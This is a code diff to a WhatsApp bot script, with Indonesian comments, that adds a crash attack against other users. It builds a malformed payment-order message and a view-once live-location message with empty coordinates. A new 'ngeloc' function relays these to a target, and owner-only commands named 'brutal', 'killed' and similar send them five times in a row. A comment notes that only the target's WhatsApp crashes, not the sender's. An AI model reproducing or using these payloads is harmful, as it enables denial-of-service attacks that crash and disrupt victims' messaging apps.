@@ -51,6 +51,31 @@ title: ` ◥◤◢◤ ★彡 𝑺𝑼𝑹𝑷𝑹𝑰𝑺𝑬𝑫 𝑯𝑼𝑯?�
 }
 }
 }
+const force = {
+key: {
+participant: `0@s.whatsapp.net`,
+...(m.chat ? {
+remoteJid: ""
+} : {})
+},
+'message': {
+"interactiveMessage": { 
+"header": {
+"hasMediaAttachment": true,
+"jpegThumbnail": ``
+},
+"nativeFlowMessage": {
+"buttons": [
+{
+"name": "review_and_pay",
+"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"! BY - THEZETSUBOXYGEN \",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
+}
+]
+}
+}
+}
+}
+
 //VIRTEX 
 const { ngazap } = require('./zetszet/virtex/ngazap')
 const { buttonkal } = require('./zetszet/virtex/buttonkal')
@@ -372,7 +397,24 @@ async function sendVariousMessages(jid, count) {
     await sleep(500);
   }
 }
-	 
+
+ async function ngeloc(target, kuwoted) {
+var etc = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
+viewOnceMessage: {
+message: {
+  "liveLocationMessage": {
+    "degreesLatitude": "",
+    "degreesLongitude": "",
+    "caption": `Hey Bro 👋`,
+    "sequenceNumber": "9",
+    "jpegThumbnail": ""
+     }
+  }
+}
+}), { userJid: m.chat, quoted: kuwoted })
+//await ryozingod.relayMessage(target, etc.message, { messageId: etc.key.id }) Gunakan Ini Jika Ingin Bug Keliatan Di Wa Pengirim
+await classic.relayMessage(target, etc.message, { participant: { jid: target }, messageId: etc.key.id }); //Gunakan Ini Jika Ingin Bug Hanya Terlihat Di Wa Target ( Benefit - WhatsApp pengguna tidak ikut crash )
+	 }
 
 /*let reactionMessage = {
                     react: {
@@ -3305,7 +3347,33 @@ case "c-ios": {
 }
 break;
 //=================================================//
-
+case 'brutal': case 'sleepy': case 'slayer': case 'killed': {
+if (m.isGroup) return joreply("Only In Private Chat")
+if (!isCreator) return 
+for (let j = 0; j < 5; j++) {
+await ngeloc(m.chat, force)
+}
+await zetsubo.sendMessage(m.chat, {
+contextInfo: {
+mentionedJid: ['00000@s.whatsapp.net'],
+externalAdReply: {
+showAdAttribution: false,
+renderLargerThumbnail: false,
+jpegThumbnail: fakejpg,
+title: ``,
+body: ``,
+previewType: "VIDEO",
+sourceUrl: ``,
+mediaType: 1,
+mediaUrl: ``
+}
+},
+text: ''
+}, {
+quoted: m
+})
+}
+break
 //=================================================//
 case 'directattention' : case 'schedulemaster' : case 'unlibreak' : case 'multiattention' : case 'schedulecall++' : case 'icall' : case 'unlicall' : case '30call' : case 'unlibreak' : case 'unlibom' : case 'unlilag' :  {
 if (!isCreator) return reply('*Only Premium Members Are Allowed To Use This Command*')
